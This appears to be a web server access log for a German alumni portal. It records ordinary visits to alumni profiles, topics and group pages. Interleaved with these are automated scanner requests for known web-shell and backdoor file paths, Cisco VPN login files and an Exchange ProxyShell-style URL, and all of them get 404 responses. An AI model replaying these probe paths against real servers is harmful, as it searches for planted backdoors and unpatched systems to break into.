b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:22:54;;/inputs.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:22:55;;/default.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:22:55;;/fm.php?p=;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:22:56;;/fm.php?fm=true;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:22:57;;/about.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:22:57;;/alfa.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:22:58;;/buy.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:22:58;;/themes/twentytwentytwo/index.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:22:59;;/wp-admin/js/wp-conflg.php?p=;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:22:59;;/wp-admin/wp-conflg.php?p=;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:00;;/wp-admin/css/wp-conflg.php?p=;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:01;;/manager.php?p=;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:01;;/js/fm.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:02;;/item.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:02;;/plugins/Cache/footer.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:03;;/404.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:03;;/mail.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:04;;/wp-content/plugins/index.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:04;;/sx.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:05;;/wp-admin/maint/admin.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:05;;/article.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:06;;/alfa.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:07;;/1.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:07;;/403.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:08;;/link.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:08;;/byp.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:09;;/bak.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:09;;/ini.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:10;;/ws.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:10;;/wp-trackback.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:11;;/.well-known/index.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:12;;/wp-includes/certificates/plugins.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:12;;/wp-content/themes/seotheme/mar.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:13;;/wp-admin/network/plugins.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:13;;/wp-admin/about.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:14;;/chosen.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:15;;/wp-includes/ID3/about.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:15;;/css/index.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:16;;/wp-admin/includes/xmrlpc.php?p=;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:17;;/wp-includes/SimplePie/wp-login.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:17;;/wp-content/themes/about.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:18;;/filemanager/dialog.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:18;;/wp-admin/maint/index.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:19;;/wp-includes/Requests/Text/admin.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:19;;/wp-includes/customize/about.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:20;;/index/function.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:21;;/uploads/autoload_classmap.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:21;;/wp-includes/css/dist/preferences/wp-login.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:22;;/wp-includes/style-engine/about.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:23;;/about/function.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:24;;/wp-includes/theme-compat/chosen.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:24;;/admin/function.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:26;;/css/colors/blue/index.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:27;;/wp-content/plugins/pwnd/as.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:27;;/wp-admin/setup-config.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:28;;/wp-admin/user/about.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:29;;/wp-admin/js/index.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:30;;/wp-content/upgrade/about.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:31;;/wp-includes/assets/index.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:32;;/wp-content/radio.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:33;;/wp-includes/fonts/index.php?p=;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:33;;/.well-known/gecko-litespeed.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:34;;/.well-known/admin.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:35;;/wp-content/admin.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:36;;/wp-content/plugins/admin.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:37;;/wp-content/themes/twentytwentytwo/index.php?p=;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:37;;/.well-known/log.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:38;;/class.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:39;;/bless.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:40;;/wp-includes/js/codemirror/index.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:40;;/wp-includes/block-patterns/index.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:41;;/lock360.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:42;;/goods.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:43;;/thai.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:44;;/bless.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:44;;/bless5.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:45;;/bless10.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:46;;/bless19.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:47;;/lala.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:48;;/135.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:48;;/inde.php;GET;404
b0261ebb98a36bf5fb00e27ad63a8e0439e08ab3b1d37cfad5543ac50e51b728;2025-11-09 05:23:49;;/admin.php;GET;404
846d25024bca598462c01e75cad96dfbff32b18e854ed6813d9a1f9570d52666;2025-11-09 05:24:52;;/.well-known/security.txt;GET;404
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-09 05:25:56;/gruppen/hobby/philosophie;/personen/alumni/schule/5508;GET;200
1c0fababa81110b8ad5f3482a7b45716d5f6b94c607269ef085240b653d38aca;2025-11-09 05:29:29;;/personen/alumni/schule/BW001;GET;200
687ae03256d60830d653acf1f6da56d19c8010102c6ee948f030c227596779a9;2025-11-09 05:38:56;;/themen/details/was-kommt-nach-dem-abitur;GET;200
4a3ee6d57a24f6a1fd140c7f605fac19896f101e6696ce999893b38e47e59c9f;2025-11-09 05:39:51;;/themen/details/was-kommt-nach-dem-abitur;GET;200
1f9d4f776408a6a5a686e27a5a305d28130ce73554041d0cb82e0cf4fc22a356;2025-11-09 05:48:12;;/developmentserver/metadatauploader;GET;404
68bac9080640e62dccd96a9af4904ca25b1f7491ebf7cfcd70f9ab48a836a046;2025-11-09 05:49:46;;/personen/alumni/details/heidi-burghard;GET;200
3e41376fafd9aaf8e381436a87ec5185e5975e5843325aca0ea0f210e4b30218;2025-11-09 05:49:48;;/;GET;200
d377c110fab3820f1e82f8603629b7e76b36d2568280cabdce2ad6807a6dfd3b;2025-11-09 05:54:48;;/;GET;200
d377c110fab3820f1e82f8603629b7e76b36d2568280cabdce2ad6807a6dfd3b;2025-11-09 05:55:30;;/.well-known/security.txt/;GET;404
d377c110fab3820f1e82f8603629b7e76b36d2568280cabdce2ad6807a6dfd3b;2025-11-09 05:55:32;;/sitemap.xml;GET;200
d377c110fab3820f1e82f8603629b7e76b36d2568280cabdce2ad6807a6dfd3b;2025-11-09 05:55:34;;/llms.txt;GET;404
85dea27dda4e3d079d77db059250125f554164d3626f1e551b0765e01a8a78fb;2025-11-09 05:58:29;;/about/allgemein;GET;200
67f9d703778c2a08657361e070fc19f3fd3f8fc71569edb4599709b65b399325;2025-11-09 06:04:37;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
2bded2543cf722df95b48d5fe7a5ab9e1052e46db4a692e9c5be4256c6c0425c;2025-11-09 06:05:42;;/;GET;200
524aae3904c4d6a2a640f6842940b759431b9944287fe356a2c4e31f89544c51;2025-11-09 06:06:33;/themen/details/bucher-auf-dem-abstellgleis;/themen/details/bucher-auf-dem-abstellgleis;GET;200
b583f5240efc763df6910f68147075e22f2dd9112ee0a368121344ff0ebfa873;2025-11-09 06:06:47;;/personen/alumni/details/joel-schlunder;GET;200
3dc2a43ecf2dfc86c1cdf2811e836c2033832f5cfda08bdff57c1bb44eefcdc8;2025-11-09 06:10:25;;/;GET;200
dc691caa830bd462f5544d5ac898b05075e695d82277fecd91a78d24224b6675;2025-11-09 06:14:08;;/personen/alumni/schule/HB0002;GET;200
b3f0ad22bd92d456e8ac1abe456a7d0d319ad625b214904a198a955736cfb010;2025-11-09 06:16:53;;/themen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
4070602e0632bad78649071643d729b22a112317434961005dfc8eaa82fcb046;2025-11-09 06:21:23;;/personen/alumni/schule/68457;GET;200
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-09 06:23:24;;/aktuelles/meldungen;GET;200
bbe11ed1454a6b84f1f13cdf47982e29bf90b5a3d71e40eed79d1cf03f87f5b6;2025-11-09 06:26:06;;/personen;GET;200
46b339cbf07f2a5dad6e9969dfde8139666f1f96a479ab8eb1127397827d3b01;2025-11-09 06:28:05;;/personen/alumni/schule/9002;GET;200
efe61709482defa3cc33cc46ed6e75ae55f446aeb1c83fbc8b9a9bb9364f544e;2025-11-09 06:28:41;;/;GET;200
d0daffc238918c25964f139056e8d4b808a085ebbe5bf6901d46e998539e5e04;2025-11-09 06:30:53;;/aktuelles/meldungen?category=community;GET;200
206c9edeb98e31045d2d85c06f5b2cae8ce6358023e988f2d58dc5ce924716b6;2025-11-09 06:34:11;;/+CSCOL+/Java.jar;GET;404
206c9edeb98e31045d2d85c06f5b2cae8ce6358023e988f2d58dc5ce924716b6;2025-11-09 06:34:12;;/+CSCOE+/logon_forms.js;GET;404
206c9edeb98e31045d2d85c06f5b2cae8ce6358023e988f2d58dc5ce924716b6;2025-11-09 06:34:14;;/+CSCOL+/a1.jar;GET;404
206c9edeb98e31045d2d85c06f5b2cae8ce6358023e988f2d58dc5ce924716b6;2025-11-09 06:34:15;;/+CSCOE+/transfer.js;GET;404
7e7ed445f8d78eef2e8c2a417bb944aafa8e31085dc8e3c1d1f07f4cc1154f27;2025-11-09 06:35:18;;/personen/alumni/schule/0349;GET;200
dc0fabd8fd99035aab174411ba5efacb36d9afbb3b02e38de1ba926e609ea46e;2025-11-09 06:36:42;;/;GET;200
25b2e9a539e75650de289b930c539f25f6bb130d2b8c9d3b39a736576847339f;2025-11-09 06:38:45;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
90d79271778f18ea88ae3b9f3c7e3bba1adf1b3056c4303a3c93b699138df11a;2025-11-09 06:38:45;;/themen?category=community;GET;200
af8f6ce770b63f9a5c8dc0c0ff3d58f56698586f20de1db8f77b86d1c5f55f90;2025-11-09 06:41:45;;/personen/alumni/schule/0350;GET;200
0764d84419c08f57713e96ffb7c66b7ab7a64cdf2d548580829a84ba32137dbb;2025-11-09 06:46:40;;/aktuelles/stellenangebote;GET;200
ba9d1265cb9daf958bb49434b21c499b1cb2c2a748b558a69ef3f5c6392683f4;2025-11-09 06:48:37;;/themen/details/stipendien-fur-den-zweiten-bildungsweg;GET;200
8a9f6039412b035664886cf47263fca73a4ab66530e8325ccae2158a82d42984;2025-11-09 06:49:04;;/personen/alumni/schule/164094;GET;200
e6744d798a21dead985cf3d691e9c69b1bc3ddb331ba2b560a34b20b30c94367;2025-11-09 06:51:34;/;/;GET;200
0e576698e9f368cebff0f17ac1bc3343e9f162ee1461b3008a29d3d4f850531a;2025-11-09 06:55:52;;/themen/details/abschied-aus-moabit;GET;200
0e333fec31e78a5ea7757b26ac8a44f58ab718c655d7238ada1c4ec71aae3830;2025-11-09 06:56:02;;/personen/alumni/schule/188001;GET;200
c0e0e9029283e56e63c53b2661dbabf8a38d14c77ca964b4ec8602281a782758;2025-11-09 06:58:08;;/themen/details/fotografie-als-kunst-und-ausdruck;GET;200
b0fc09974eff08269ccdac314c99d89cef8d182d0a7d9c810b2f04557a24f04d;2025-11-09 07:03:35;;/personen/alumni/schule/183052;GET;200
34d7ffd5b61e3a02fe531565c9001331ffbc19c3ca5e01d5459b9ebcd2d69b34;2025-11-09 07:05:07;;/;GET;200
8507066b1e0828017ac9a01b5c689a33dacdcf96b9a0a6e45f60d277fd337012;2025-11-09 07:06:24;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
69192310ba00041ca2468d0b781544e84753a522924ef7e5c5a1ea50a97115d4;2025-11-09 07:07:09;/;/;GET;200
6c0a79a65525c2817f69ef589fad67d4cb58b17f5b81f95e6c87f70705274c18;2025-11-09 07:09:52;;/personen/alumni/details/benjamin-wagner;GET;200
25c9231444a95a21b4ada4e5bbc8fa954b1d79f4ed766b5f18dacf6956b99940;2025-11-09 07:09:55;;/gruppen/hobby/kochen-und-backen;GET;302
98fe76a9ea6c05cb87ada18f70a8c4808b44cb895d105498c5903cd276dbebde;2025-11-09 07:09:57;;/themen/details/stipendien-fur-den-zweiten-bildungsweg;GET;200
c2eea36f03bfe195e8f111eb05ac8caed7df97df9b6a4e2fbd4f3cd34d63d527;2025-11-09 07:09:59;;/gruppen/hobby/abschlussfest;GET;302
062d33aabf427961582b46a52fd5b3d5037d527d8fbc7a2a3296495b6861231f;2025-11-09 07:10:05;;/personen/alumni/details/josephine-muller;GET;200
f02af0617cc8a654612cf9223c4977aae5b0bedc3035da554dd960a1c96a3547;2025-11-09 07:10:06;;/gruppen/hobby/debattieren;GET;302
214c42792dd45b34c03aaf3a8e6854b7818abd5d1ca432a659670998c8db97e0;2025-11-09 07:10:06;;/gruppen;GET;200
6e5b3d3ed8ffc56780a5365dbd73ac6f87a0bdebedc8cd40a34f1d3b3b55d4c9;2025-11-09 07:10:07;;/gruppen;GET;200
aa2384736b80f8ad3797087ef04bad8669f1f40b78a1a14a619da0e77d5c74b5;2025-11-09 07:10:08;;/personen/alumni/details/thomas-matzig;GET;200
165dd69a21e306b81022c29602c855b750156a560553aed0fa224ca46f877151;2025-11-09 07:10:10;;/gruppen/hobby/fremdsprachen;GET;302
6be0afa794020b735a8e2811c912e54901e966ef3072eee9e611efa2f9bc7b37;2025-11-09 07:10:11;;/gruppen/hobby/astronomie;GET;302
a07ced6980cc751c27efa00f6a87d58a719384a28387abb968546d9cc56eb0f5;2025-11-09 07:10:12;;/gruppen;GET;200
643effbaccc147f46106d010db1a694125a1be8f6a5c475f34ddc0b0bf453774;2025-11-09 07:10:13;;/personen/alumni/details/jeanette-stephan;GET;200
d4382e97657158433e02871c2c50e740b4e3dc82f7bc9118f5e8843b7bb95d55;2025-11-09 07:10:13;;/gruppen;GET;200
172d41ece2c7200529ae97cfb2520a73dba97a416ff4a4d197f90eff9e870c13;2025-11-09 07:10:14;;/gruppen/hobby/fitness;GET;302
88720d8f54effc076a21577431e0a0df692a2eba654435747eda2f7a36d427db;2025-11-09 07:10:15;;/gruppen;GET;200
3c5845b30ea2ed23c77feed839506d352a1a6cb333d6491f95c86988cae319bd;2025-11-09 07:10:15;;/personen/alumni/details/jessica-schwarz;GET;200
31b3239fb29927c702f5cd0270df505396a1ecad5ac6695c664ba15e9c52a7c4;2025-11-09 07:10:19;;/personen/alumni/details/joel-schlunder;GET;200
710b7931c15e3b33c626586ba1479082c231b35f96904b9925de33806e5eba53;2025-11-09 07:10:20;;/personen/alumni/details/jana-zenker;GET;200
ebf03adb7d4c07f34d3762518574447e7901686af14b3ff2e879c3a72c49354b;2025-11-09 07:10:23;;/personen/alumni/details/cynthia-ott;GET;200
f9c415a682d9db803de9da0566f14fae988001620ff5061c0e7be39f18ce52d6;2025-11-09 07:10:43;;/gruppen/hobby/politik-und-debatten;GET;302
592802d4d60c2eb7687cd5eccdef38bb9c633791ebeb330c9437c5603c700800;2025-11-09 07:11:52;;/themen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
380d7742379b851d607803b90372b36c4a74288c6f1a8fe09cef17bd8a35f567;2025-11-09 07:15:20;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
1c0fababa81110b8ad5f3482a7b45716d5f6b94c607269ef085240b653d38aca;2025-11-09 07:18:03;;/personen/alumni/schule/600027;GET;200
f183389a7aeb4957e380f8b66c9e82deb6c40165fcd4b390fe437bcb89d42404;2025-11-09 07:18:54;;/themen?category=politik;GET;200
ebf5bcd42b71d88ce816d73757cdadfc6894130082467564dddcfde2b2ef59c2;2025-11-09 07:25:09;;/personen/alumni/details/cynthia-ott;GET;200
6604894891341a817bba4f83a2a03a7a2392aa82f03ef75dac1ace58cd1dcdf0;2025-11-09 07:29:12;/;/;GET;200
69d4429428864c08e6691cc91f073a2b485e7bca924e01b70834abec60b61c9e;2025-11-09 07:29:34;;/themen/details/wenn-sicherheit-sichtbar-wird;GET;200
7ed9733835ddf4597b0825fa6cfecc012030efd7c4370a613ae0f31a46bfeda2;2025-11-09 07:32:04;;/personen/alumni/schule/4440012;GET;200
8affb5828293a93baf748217ab3b9089421340aad9719809eb133c1e6c8df4c7;2025-11-09 07:36:30;;/;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-09 07:37:19;;/personen/alumni/details/thomas-matzig;GET;200
9f0370abd905eb6086fac5f88d4d3425690ffaaf1c38341818bda8bd0be260df;2025-11-09 07:38:48;;/themen/details/david-gegen-goliath;GET;200
1943838ad3d1cf08f3e15ebe6652308ef14c79817fbb78124dffdb6e148e04b6;2025-11-09 07:42:47;;/themen/details/was-kommt-nach-dem-abitur;GET;200
cb72eb0418ace7654c405e92adb4499de145cca21b9ee066584a01bf159be363;2025-11-09 07:49:55;;/themen/details/der-start-ins-studium;GET;200
66404f0ed01f304b2c41d402c392067adf0c1f9a83e76a8e63f0a6ccbb664c58;2025-11-09 07:50:01;;/;GET;200
a31306057511df7b34d97fd6c9e5a608d345b53bf166636bd319fb37f20d0b7f;2025-11-09 07:50:29;;/themen/2;GET;200
8a9f6039412b035664886cf47263fca73a4ab66530e8325ccae2158a82d42984;2025-11-09 07:51:32;;/personen/alumni/details/heidi-burghard;GET;200
7922f3bc9194fbae84b2a5854b22446adaf3efcf0def6bb1a0fb601ca6564439;2025-11-09 07:54:20;;/autodiscover/autodiscover.json?@zdi/Powershell;GET;404
2240adee0edf3451b26de1678fa6bedf0d3e1958b7ca1c6c0478de86973cf679;2025-11-09 07:59:12;;/about/allgemein;GET;200
21cf1ffa598626e43f462938a7f16147195b7a94d049ed63f8315cffae11df08;2025-11-09 08:01:14;;/themen/details/abschied-aus-moabit;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:02:26;;/;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:02:31;/;/profile;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:02:42;/profile;/gruppen/plausch/foyer;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:02:46;/gruppen/plausch/foyer;/logout;GET;302
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:02:46;/gruppen/plausch/foyer;/;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:02:47;;/gruppen/plausch/foyer;GET;302
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:02:47;;/gruppen/hobby/abschlussfest;GET;302
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:02:47;;/gruppen;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:02:55;/gruppen;/profile;GET;302
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:02:55;/gruppen;/login;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:02:56;/login;/profile;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:03:02;/profile;/gruppen/plausch/live-musik-und-bands;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:04:47;/gruppen/plausch/live-musik-und-bands;/gruppen/hobby/abschlussfest;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:04:49;/gruppen/hobby/abschlussfest;/gruppen/plausch/foyer;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:04:51;/gruppen/plausch/foyer;/gruppen/hobby/abschlussfest;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:04:53;/gruppen/hobby/abschlussfest;/gruppen/plausch/foyer;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:04:54;/gruppen/plausch/foyer;/gruppen/hobby/abschlussfest;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:04:55;/gruppen/hobby/abschlussfest;/gruppen/plausch/live-musik-und-bands;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:05:01;/gruppen/plausch/live-musik-und-bands;/gruppen/hobby/abschlussfest;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:05:06;/gruppen/hobby/abschlussfest;/gruppen/plausch/foyer;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:05:07;/gruppen/plausch/foyer;/gruppen/hobby/abschlussfest;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:05:55;/gruppen/hobby/abschlussfest;/gruppen/plausch/live-musik-und-bands;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:07:19;/gruppen/plausch/live-musik-und-bands;/personen/alumni/details/benjamin-wagner;GET;200
07a9f464d7e7ce196cd7e854d9b15d107cd72407f52243deb2c242e14fb63d8f;2025-11-09 08:07:20;;/personen/alumni/details/joel-schlunder;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:07:37;/personen/alumni/details/benjamin-wagner;/veranstaltungen;GET;200
